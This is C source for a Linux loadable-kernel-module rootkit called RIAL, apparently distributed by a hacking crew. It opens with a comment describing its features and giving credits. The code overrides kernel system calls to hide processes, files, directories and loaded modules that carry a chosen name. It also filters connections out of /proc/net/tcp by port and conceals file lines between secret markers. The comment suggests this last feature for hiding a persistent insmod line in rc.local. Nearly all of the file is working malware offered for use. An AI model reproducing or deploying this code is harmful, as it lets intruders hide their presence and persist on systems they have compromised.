/*
[ RIAL ]

[ Rootkit In A Lkm ]

[ by techno[k]  /  member of Packet Knights Crew ]

<www.pkcrew.org>


RIAL can hide processes, files, directories, LKMs, connections and file
parts. While some of these are present in a large number of lkms, connections
and file-parts hiding are new ideas, or at least i couldnt find any lkm    
which had them. All the processes, files, directories and lkms containing in 
their name the string defined in HIDE are hidden. Reading from /proc/net/tcp is
intercepted and read data is filtered to hide some connections. LOCALHIDE
defines the local ports to hide. If for example we define LOCALHIDE as 48E 
all connections on local ports from 48E0h to 48EFh will be hidden.
If you want to hide some connections for which you dont know the local port,
but only the remote one, you can define REMOTEHIDE1, REMOTEHIDE2, 
and REMOTEHIDE3, and all connections to these ports are hidden.
No adjustment is done on these strings, so remember to write them as they
would appear in /proc/net/tcp (four digits hex, capital letters).
File parts are hidden using a secret line. In every file, every line 
beetween two <SECRETLINE> is hidden (and the secretlines too), so you could
use it to add an insmod in rc.local, so that it isnt seen when RIAL is
active, but if the system is rebooted lines are read, so RIAL will be
started again.

=*=*

<-- Credits -->

FuSyS ---> new_query_module function
plaguez ---> myatoi function

<-- Greetings -->

CyRaX, Asynchro, Falcon, Devil666, Vecna, Spooky, WardMase, all the 
PKC members, all the ppl on #alby00, #sikurezza, and #cacca

=*=*


techno[k] (technok@pkcrew.org)

*/

#define MODULE
#define __KERNEL__

#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/types.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/mm.h>
#include <linux/if.h>
#include <sys/syscall.h>
#include <asm/types.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <asm/segment.h>
#include <linux/types.h>
#include <linux/malloc.h>
#include <asm/unistd.h>
#include <asm/string.h>

#define HIDE "rial" 
#define SECRETLINE "#rial-line"
#define LOCALHIDE "48E"
#define REMOTEHIDE1 "1A0A" 
#define REMOTEHIDE2 "1A0B"
#define REMOTEHIDE3 "1A0D"


extern void* sys_call_table[];
int errno;
int (*old_getdents)(uint,struct dirent *,uint);
int (*old_query_module)(const char *,int,char *,size_t,size_t *);
int (*old_read)(unsigned int,char *,unsigned int);
int (*old_open)(const char *,int,int);
int (*old_close)(unsigned int);

int netds[50];

int myatoi(char *str){
 int res = 0;
 int mul = 1;
 char *ptr;
 for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
  if (*ptr < '0' || *ptr > '9')
   return (-1);
  res += (*ptr - '0') * mul;
  mul *= 10;
}
 return (res);
}

struct task_struct *get_task_structure(pid_t n){
 struct task_struct *tsp;
 int t;
	tsp=current;
	do{
		if(tsp->pid==n)return tsp;		
		 tsp=tsp->next_task;	
	}while(tsp!=current);
	return NULL;
}
int new_open(const char *filename,int flags,int mode){
 int r,hm,t;
 char *kstr;

	hm=strlen(filename);
	r=old_open(filename,flags,mode);
        if((r<3)||(hm>30))return r;
        kstr=(char*)kmalloc(hm+1,GFP_KERNEL);
	memset(kstr,0,hm+1);
	if(kstr==NULL)return r;
        memset(kstr,0,hm);
        copy_from_user(kstr,filename,hm);
	if(!strcmp(kstr,"/proc/net/tcp")){
		for(t=0;t<50;t++){
			if(!netds[t])break;
		}
		if(t==50)return r;
		netds[t]=r;	
	}
	kfree(kstr);
	return r;
}
int new_close(unsigned int fd){
 int t;
	for(t=0;t<50;t++){
		if(netds[t]==fd){
			netds[t]=0;
			break;
		}
	}
	return old_close(fd);
}

int new_read(unsigned int fd,char *buf,unsigned int count){
 char *kbuf,*kbuf2,*cp,*tp,*tp2,ch;
 int t,r,rr,hb,hmp;
	
	r=old_read(fd,buf,count);
        if(r<0)return r;
	if(r>20000)return r;
        kbuf=(char*)kmalloc(r+1,GFP_KERNEL);
        kbuf2=(char*)kmalloc(r+1,GFP_KERNEL);
        memset(kbuf,0,r+1);
        memset(kbuf2,0,r+1);

	if((kbuf==NULL)||(kbuf2==NULL))return r;
        copy_from_user(kbuf,buf,r);
        for(t=0;t<50;t++){
		if(netds[t]==fd){
			break;
		}
	}
       if((t<50)&&(fd>2)){

	for(t=0,hb=0,hmp=0,cp=kbuf2,rr=r;t<r;t++){
		if(strstr(((char*)(kbuf+t))," 0:")==((char*)(kbuf+t)))hb=1;
		if(hb){
		    tp=strstr(((char*)(kbuf+t)),":");
		    if(tp){
			tp2=strstr(tp+1,":");
			if(tp2){
	                        tp=strstr(tp2+1,":");
				if((strstr(++tp2,LOCALHIDE)==tp2)||(strstr(++tp,REMOTEHIDE1)==tp)||(strstr(++tp,REMOTEHIDE2)==tp)||(strstr(++tp,REMOTEHIDE3)==tp)){
					do{
						rr--;
						t++;
					}while((*((char*)(kbuf+t))!='\n')&&(t<r));	
					if(t>=r)goto uez;
					t++;
					rr--;
					hb=2;
				}
			}	
		    }	
		    if(hb==2)hb=1;
                     else hb=0;
		}

              if(*((char*)(kbuf+t))==':')hmp++;
	      if((hmp==5)&&(*((char*)(kbuf+t))=='\n')){
		hmp=0;
		hb=1;
	      }
  
            *(cp++)=*((char*)(kbuf+t));
	}
  
     }
       else{

	for(t=0,cp=kbuf2,rr=r;t<r;t++){
		ch=*((char*)(kbuf+t+strlen(SECRETLINE))+1);
		*((char*)(kbuf+t+strlen(SECRETLINE))+1)='\0';
		if(strstr((char*)(kbuf+t),SECRETLINE)==(char*)(kbuf+t)){
			do{
	                        *((char*)(kbuf+t+strlen(SECRETLINE))+1)=ch;
				t++;
				rr--;
				if(t>=r)goto uez;	
		                ch=*((char*)(kbuf+t+strlen(SECRETLINE))+1);
		                *((char*)(kbuf+t+strlen(SECRETLINE))+1)='\0';
			}while(strstr((char*)(kbuf+t),SECRETLINE)!=(char*)(kbuf+t));
	                *((char*)(kbuf+t+strlen(SECRETLINE))+1)=ch;
			t+=strlen(SECRETLINE);rr-=strlen(SECRETLINE);
			
		}
		else *((char*)(kbuf+t+strlen(SECRETLINE))+1)=ch;

		*(cp++)=*((char*)(kbuf+t));	
	}


uez:;
       }  
	copy_to_user(buf,kbuf2,rr);

	kfree(kbuf);kfree(kbuf2);

	return rr;

}

int new_getdents(unsigned int fd, struct dirent *dirp, unsigned int count){
 int hmr,hme,original_ret,left;
 struct dirent *d,*d2;
 struct inode *dinode;
 int ps=0,tohide;
 struct task_struct *tsp;

 	if((original_ret=old_getdents(fd,dirp,count))==-1)return(-errno);
	#ifdef __LINUX_DCACHE_H
 		dinode=current->files->fd[fd]->f_dentry->d_inode;
	#else
 		dinode=current->files->fd[fd]->f_inode;
	#endif
	 if (dinode->i_ino==PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev)==1)ps=1;

	
	d=(struct dirent *)kmalloc(original_ret,GFP_KERNEL);
	copy_from_user(d,dirp,original_ret);
	d2=d;
	left=original_ret;
	hme=0;
	while(left>0){
		hmr=d2->d_reclen;
		left-=hmr;
		tohide=0;
		if(ps){
			tsp=get_task_structure(myatoi(d2->d_name));
			if((tsp!=NULL)&&(strstr(tsp->comm,HIDE)))tohide=1;
		}
		if((strstr((char*)d2->d_name,HIDE))||(tohide)){
			if(left>0)memmove(d2,(char*)d2+hmr,left);	
                         else d2->d_off=1024;
			original_ret-=hmr;	
		}
		else d2=(struct dirent*)((char*)d2+hmr);
	}	
	copy_to_user(dirp,d,original_ret);
	kfree(d);
	return original_ret;
}

int new_query_module(const char *name, int which, char *buf, size_t bufsize,
        size_t *ret)
{
        int res;
        int cnt;
        char *ptr, *match;

        res = (*old_query_module)(name, which, buf, bufsize, ret);

        if(res == -1)
                return(-errno);

        if(which != QM_MODULES)
                return(res);

        ptr = buf;

        for(cnt = 0; cnt < *ret; cnt++) {
                if(strstr(ptr,HIDE)) {
                        match = ptr;
                        while(*ptr)
                                ptr++;
                        ptr++;
                        memcpy(match, ptr, bufsize - (ptr - (char *)buf));
                        (*ret)--;
                        return(res);
                }
                while(*ptr)
                        ptr++;
                ptr++;
        }

        return(res);
}



int init_module(void){
 int t;
	for(t=0;t<50;t++)netds[t]=0;
 	old_getdents=sys_call_table[SYS_getdents];
	sys_call_table[SYS_getdents]=new_getdents;
        old_query_module=sys_call_table[SYS_query_module];
        sys_call_table[SYS_query_module]=new_query_module;
        old_open=sys_call_table[SYS_open];
        sys_call_table[SYS_open]=new_open;
        old_close=sys_call_table[SYS_close];
        sys_call_table[SYS_close]=new_close;
        old_read=sys_call_table[SYS_read];
        sys_call_table[SYS_read]=new_read;
	return 0;

}
void cleanup_module(void){
        sys_call_table[SYS_getdents]=old_getdents;
        sys_call_table[SYS_query_module]=old_query_module; 
        sys_call_table[SYS_read]=old_read;
        sys_call_table[SYS_open]=old_open;
        sys_call_table[SYS_close]=old_close;

}
